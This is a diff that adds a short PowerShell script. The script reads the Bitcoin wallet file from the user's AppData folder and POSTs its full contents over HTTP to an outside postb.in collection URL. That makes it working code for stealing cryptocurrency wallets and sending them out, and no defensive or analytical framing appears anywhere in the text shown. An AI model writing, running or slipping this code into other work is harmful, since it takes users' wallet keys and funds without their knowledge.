@@ -1,0 +1,24 @@
+$b = [IO.File]::ReadAllText("$env:APPDATA\Bitcoin\wallet.dat")
+$bu = [text.encoding]::ascii.getbytes($b)
+$u="http://postb.in/2HKymBLm"
+[net.httpWebRequest] $req = [net.webRequest]::create($u)
+$req.method = "POST"
+$req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+$req.Headers.Add("Accept-Language: en-US")
+$req.Headers.Add("Accept-Encoding: gzip,deflate")
+$req.Headers.Add("Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7")
+$req.AllowAutoRedirect = $false
+$req.ContentType = "application/x-www-form-urlencoded"
+$req.ContentLength = $bu.length
+$req.TimeOut = 50000
+$req.KeepAlive = $true
+$req.Headers.Add("Keep-Alive: 300")
+$reqst = $req.getRequestStream()
+$reqst.write($bu, 0, $bu.length)
+$reqst.flush()
+$reqst.close()
+[net.httpWebResponse] $res = $req.getResponse()
+$resst = $res.getResponseStream()
+$sr = new-object IO.StreamReader($resst)
+$result = $sr.ReadToEnd()
+$res.close()
